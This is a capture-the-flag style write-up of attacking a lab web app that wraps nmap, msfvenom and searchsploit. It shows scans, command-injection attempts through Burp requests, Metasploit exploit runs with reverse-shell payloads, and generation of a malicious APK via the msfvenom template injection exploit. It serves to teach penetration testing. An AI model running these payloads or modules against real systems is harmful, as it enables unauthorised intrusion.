# Summary
### 1. NMAP

### 2. Port 5000 HTTP Enumeration

### 3. Port 5000 HTTP Attack Attempt 1

### 4. Port 5000 HTTP Attack Attempt 2

### 5. Port 5000 HTTP Attack Attempt 3

# Attack
## 1. NMAP
Took a long time to run, but here it is.
```
hippoeug@kali:~$ nmap --script vuln 10.129.72.251 -sC -sV -Pn -v
Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-07 12:40 +08
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:openbsd:openssh:8.2p1: 
|       CVE-2020-15778  6.8     https://vulners.com/cve/CVE-2020-15778
|       CVE-2020-12062  5.0     https://vulners.com/cve/CVE-2020-12062
|_      CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.72.251
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.129.72.251:5000/
|     Form id: ip
|     Form action: /
|     
|     Path: http://10.129.72.251:5000/
|     Form id: os
|     Form action: /
|     
|     Path: http://10.129.72.251:5000/
|     Form id: search
|_    Form action: /
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-fileupload-exploiter: 
|   
|     Failed to upload and execute a payload.
|   
|_    Failed to upload and execute a payload.
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:python:python:3.8.5: 
|       CVE-2021-3177   7.5     https://vulners.com/cve/CVE-2021-3177
|       CVE-2020-27619  7.5     https://vulners.com/cve/CVE-2020-27619
|       MSF:PAYLOAD/PYTHON/SHELL_REVERSE_UDP/   0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/SHELL_REVERSE_UDP/    *EXPLOIT*
|       MSF:PAYLOAD/PYTHON/SHELL_REVERSE_TCP_SSL/       0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/SHELL_REVERSE_TCP_SSL/        *EXPLOIT*
|       MSF:PAYLOAD/PYTHON/SHELL_REVERSE_TCP/   0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/SHELL_REVERSE_TCP/    *EXPLOIT*
|       MSF:PAYLOAD/PYTHON/PINGBACK_REVERSE_TCP/        0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/PINGBACK_REVERSE_TCP/ *EXPLOIT*
|       MSF:PAYLOAD/PYTHON/METERPRETER_REVERSE_HTTPS/   0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/METERPRETER_REVERSE_HTTPS/    *EXPLOIT*
|       MSF:PAYLOAD/PYTHON/METERPRETER_REVERSE_HTTP/    0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/METERPRETER_REVERSE_HTTP/     *EXPLOIT*
|       MSF:PAYLOAD/PYTHON/METERPRETER_BIND_TCP/        0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/METERPRETER_BIND_TCP/ *EXPLOIT*
|       MSF:PAYLOAD/PYTHON/METERPRETER/REVERSE_HTTP/    0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/METERPRETER/REVERSE_HTTP/     *EXPLOIT*
|       MSF:PAYLOAD/PYTHON/METERPRETER/BIND_TCP_UUID/   0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/METERPRETER/BIND_TCP_UUID/    *EXPLOIT*
|_      MSF:PAYLOAD/PYTHON/METERPRETER/BIND_TCP/        0.0     https://vulners.com/metasploit/MSF:PAYLOAD/PYTHON/METERPRETER/BIND_TCP/ *EXPLOIT*
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```
Okay, so we know 2 ports opened, Port 22 SSH and a Port 5000 HTTP port. This Port 5000 is an interesting one, showing it's a Werkzeug httpd 0.16.1 (Python 3.8.5).

## 2. Port 5000 HTTP Enumeration
Let's visit `http://10.129.72.251:5000/` and see what we get.
```
k1d'5 h4ck3r t00l5
nmap
scan top 100 ports on an ip
ip:

payloads
venom it up - gen rev tcp meterpreter bins
os:
lhost:
template file (optional):

sploits
searchsploit FTW
search:
```
Ah, a website that basically runs NMAP, MSFVenom, & SearchSploit for you. So theoritically, this web interface is directly connected to a actual Kali Linux machine? If badly configured, we can run direct commands to it! 

Anyways, let's try one of them NMAP. We will scan itself, META AF.
```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-07 04:43 UTC
Nmap scan report for 10.129.72.251
Host is up (0.00019s latency).
Not shown: 98 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 10.71 seconds
```
It worked!

While we're at it, we run a quick GoBuster to see what we get.
```
hippoeug@kali:~$ gobuster dir -u "http://10.129.72.251:5000" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.129.72.251:5000
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/07 12:51:30 Starting gobuster
===============================================================
===============================================================
2021/02/07 13:10:26 Finished
===============================================================
```
Nothing, no sub-directories.

Let's do a SearchSploit.
```
hippoeug@kali:~$ searchsploit werkzeug
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Werkzeug - 'Debug Shell' Command Execution                                                                                          | multiple/remote/43905.py
Werkzeug - Debug Shell Command Execution (Metasploit)                                                                               | python/remote/37814.rb
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Since there is a Metasploit module, let's give this a shot real quick.
```
msf5 > use exploit/multi/http/werkzeug_debug_rce
[*] No payload configured, defaulting to python/meterpreter/reverse_tcp
msf5 exploit(multi/http/werkzeug_debug_rce) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   werkzeug 0.10 and older


msf5 exploit(multi/http/werkzeug_debug_rce) > show options
...
msf5 exploit(multi/http/werkzeug_debug_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.12:4444 
[-] Secret code not detected.
[*] Exploit completed, but no session was created.
msf5 exploit(multi/http/werkzeug_debug_rce) > 
```
Unfortunately, our version is newer and would not work!

## 3. Port 5000 HTTP Attack Attempt 1
Let's run Burp Suite and try to see what we get when running a the NMAP function.
```
POST / HTTP/1.1
Host: 10.129.72.251:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.72.251:5000/
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Connection: close
Upgrade-Insecure-Requests: 1

ip=127.0.0.1&action=scan
```
Interesting, let's try to run multiple commands by modifying the request on BurpSuite. 

We will use CyberChef URL Encode/Decode function, where `;` is `%3B`.
```
POST / HTTP/1.1
Host: 10.129.72.251:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.72.251:5000/
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Connection: close
Upgrade-Insecure-Requests: 1

ip=127.0.0.1%3Bpwd&action=scan
```
Unforunately, this didn't work and we get an error `invalid ip`.

Another attempt at running another function SPLOITS.
```
POST / HTTP/1.1
Host: 10.129.72.251:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.72.251:5000/
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Connection: close
Upgrade-Insecure-Requests: 1

search=werkzeug&action=searchsploit
```
And we change it on BurpSuite.
```
POST / HTTP/1.1
Host: 10.129.72.251:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.72.251:5000/
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Connection: close
Upgrade-Insecure-Requests: 1

search=werkzeug%3Bpwd&action=searchsploit
```
This time however, we get an error `stop hacking me - well hack you back`.

## 4. Port 5000 HTTP Attack Attempt 2
With clues from online, it turns out that I needed more SearchSploits.
```
ippoeug@kali:~$ searchsploit nmap
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Android - binder Use-After-Free of VMA via race Between reclaim and munmap                                                          | android/dos/46357.txt
Android - Inter-Process munmap due to Race Condition in ashmem                                                                      | android/dos/43464.txt
Apache Struts 2 - DefaultActionMapper Prefixes OGNL Code Execution (Metasploit)                                                     | multiple/remote/27135.rb
BaconMap 1.0 - Local File Disclosure                                                                                                | php/webapps/15234.txt
BaconMap 1.0 - SQL Injection                                                                                                        | php/webapps/15233.txt
Google Android - Inter-process munmap in android.util.MemoryIntArray                                                                | android/dos/41354.txt
Google Android - Inter-Process munmap with User-Controlled Size in android.graphics.Bitmap                                          | android/remote/40874.txt
Microsoft Edge - 'UnmapViewOfFile' ACG Bypass                                                                                       | windows/dos/44096.txt
Nmap - Arbitrary File Write                                                                                                         | linux/remote/38741.txt
Novell NetMail 3.52d - NMAP STOR Buffer Overflow (Metasploit)                                                                       | windows/remote/16813.rb
PaX - Double-Mirrored VMA munmap Privilege Escalation                                                                               | linux/local/876.c
Snortreport - '/nmap.php' / 'nbtscan.php' Remote Command Execution (Metasploit)                                                     | php/webapps/17947.rb
Zenmap (Nmap) 7.70 - Denial of Service (PoC)                                                                                        | windows_x86/dos/45357.txt
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Nothing here.
```
hippoeug@kali:~$ searchsploit searchsploit
Exploits: No Results
Shellcodes: No Results
```
Nope. Funny though.
```
hippoeug@kali:~$ searchsploit msf
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Cisco IOS 12 MSFC2 - Layer 2 Frame Denial of Service                                                                                | hardware/dos/23638.pl
CmsFaethon 2.2.0 (ultimate.7z) - Multiple Vulnerabilities                                                                           | php/webapps/11894.txt
CmsFaethon 2.2.0 - 'item' SQL Injection                                                                                             | php/webapps/8054.pl
Joomla! Component com_jmsfileseller - Local File Inclusion                                                                          | php/webapps/17338.txt
Liferay Portal - Java Unmarshalling via JSONWS RCE (Metasploit)                                                                     | java/remote/48332.msf
Metasploit Framework - 'msfd' Remote Code Execution (Metasploit)                                                                    | ruby/remote/44570.rb
Metasploit Framework - 'msfd' Remote Code Execution (via Browser) (Metasploit)                                                      | ruby/remote/44569.rb
Microsoft Edge Chakra - 'AppendLeftOverItemsFromEndSegment' Out-of-Bounds Read                                                      | windows/dos/43522.js
PHP-fusion dsmsf Mod Downloads - SQL Injection                                                                                      | php/webapps/12028.txt
unrar 5.40 - 'VMSF_DELTA' Filter Arbitrary Memory Write                                                                             | multiple/dos/42245.txt
webERP 4.0.1 - 'InputSerialItemsFile.php' Arbitrary File Upload                                                                     | php/webapps/35333.py
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Shellcode Title                                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Linux/x86 - Read File (/etc/passwd) + MSF Optimized Shellcode (61 bytes)                                                            | linux_x86/45416.c
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
```
Ayy! `Metasploit Framework - 'msfd' Remote Code Execution (Metasploit)` is looking promising, let's give that a shot!
```
msf5 > use exploit/multi/misc/msfd_rce_remote
[*] No payload configured, defaulting to generic/shell_reverse_tcp
...
msf5 exploit(multi/misc/msfd_rce_remote) > show options
...
msf5 exploit(multi/misc/msfd_rce_remote) > exploit

[*] Started reverse TCP handler on 10.10.x.x:6969 
[*] Exploit completed, but no session was created.
```
Nope. Time for something new.

## 5. Port 5000 HTTP Attack Attempt 3
With even more clues, it turns out there is a more recent CVE. 

There's a [`Metasploit Framework 6.0.11 - msfvenom APK template command injection`](https://www.exploit-db.com/exploits/49491) exploit, where an [advisory](https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md) has been written for it. More importantly, a [guide](https://github.com/rapid7/metasploit-framework/pull/14331) of sorts to utilize this exploit.

Since there's a Metasploit module written for it, we shall use it.
```
msf6 > use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > show options

Module options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.apk          yes       The APK file name
...
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set lhost 10.10.x.x
lhost => 10.10.x.x
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > exploit

[+] msf.apk stored at /home/hippoeug/.msf4/local/msf.apk
```
Interesting! This generates a `.apk` file! 
